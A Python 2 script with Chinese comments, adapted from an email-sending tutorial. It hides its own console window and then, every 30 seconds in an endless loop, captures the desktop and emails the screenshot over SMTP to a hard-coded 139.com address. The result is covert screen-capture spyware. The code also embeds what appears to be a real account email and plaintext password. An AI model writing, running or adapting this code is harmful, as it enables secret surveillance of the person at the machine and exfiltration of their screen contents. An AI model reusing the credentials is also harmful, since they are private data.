# -*- coding: utf-8 -*-

#源码 https://github.com/michaelliao/learn-python/blob/master/email/sendmail_multipart.py
#感谢 Michael Liao

from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.utils import parseaddr, formataddr
from PIL import Image,ImageGrab
import os
import time

import smtplib

##python隐藏console window的另一个方法

# 做GUI系统的时候，总是想去掉DOS窗口，而一般的做法是用pythonw.exe启动。
# 很可惜，目前的2.5版本的pythonw是有一些bug的。
# 见：http://mail.python.org/pipermail/python-bugs-list/2004-June/023703.html 。
# 我在做项目的时候就遇到过这类问题，而且还有一些乱七八糟解释不了的问题，而用python.exe启动就是好的，但是恼人的黑窗口又出现了。 
# # 其实有一种办法可以解决，不能跨平台，仅限windows。是用windows api的ShowWindow方法，将console隐藏（就是看不到而已）。
# 需要win32api库（copy两个文件win32api.pyd和win32gui.pyd就行了）。
# 很简单吧，就是获得console的handle，然后隐藏（0分别代表NULL和SW_HIDE）。启动还是用python.exe。
# 不过有一个缺点，DOS窗口在开始的时候会闪一下，:-)。
#原链接http://noahgenius.iteye.com/blog/216124

import win32api, win32gui  
ct = win32api.GetConsoleTitle()  
hd = win32gui.FindWindow(0,ct)  
win32gui.ShowWindow(hd,0)
######################################


def _format_addr(s):
	name, addr = parseaddr(s)
	return formataddr(( \
		Header(name, 'utf-8').encode(), \
		addr.encode('utf-8') if isinstance(addr, unicode) else addr))

from_addr = "13564945645@139.com"
password = "13564945645syy"
to_addr = "13564945645@139.com"
smtp_server = "smtp.139.com"

##原方法，会带多个附件发送，修正方法见下

# msg = MIMEMultipart()
# msg['From'] = _format_addr(u'桌面截图 <%s>' % from_addr)
# msg['To'] = _format_addr(u'管理员 <%s>' % to_addr)
# msg['Subject'] = Header(u'来自SMTP的问候……', 'utf-8').encode()

# # add MIMEText:
# msg.attach(MIMEText('send with file...', 'plain', 'utf-8'))

def attachnew():
	#截图
	im = ImageGrab.grab() 
	im.save("screenshot.png")#保存图片 

	


while True:
	attachnew()
	##add file:
	with open('screenshot.png', 'rb') as f:
		mime = MIMEBase('image', 'png', filename='screenshot.png')
		mime.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
		mime.add_header('Content-ID', '<0>')
		mime.add_header('X-Attachment-Id', '0')

		##修正每次多带附件问题，每次初始化MIMEMultipart()方法就可使
		##self._payload = []为空集，不会再带多个附件发送

		msg = MIMEMultipart()
		msg['From'] = _format_addr(u'桌面截图 <%s>' % from_addr)
		msg['To'] = _format_addr(u'管理员 <%s>' % to_addr)
		msg['Subject'] = Header(u'来自SMTP的问候……', 'utf-8').encode()

		# add MIMEText:
		msg.attach(MIMEText('send with file...', 'plain', 'utf-8'))

		mime.set_payload(f.read())
		encoders.encode_base64(mime)
		msg.attach(mime)

	server = smtplib.SMTP(smtp_server, 25)
	server.set_debuglevel(1)
	server.login(from_addr, password)
	server.sendmail(from_addr, [to_addr], msg.as_string())
	server.quit()
	time.sleep(30)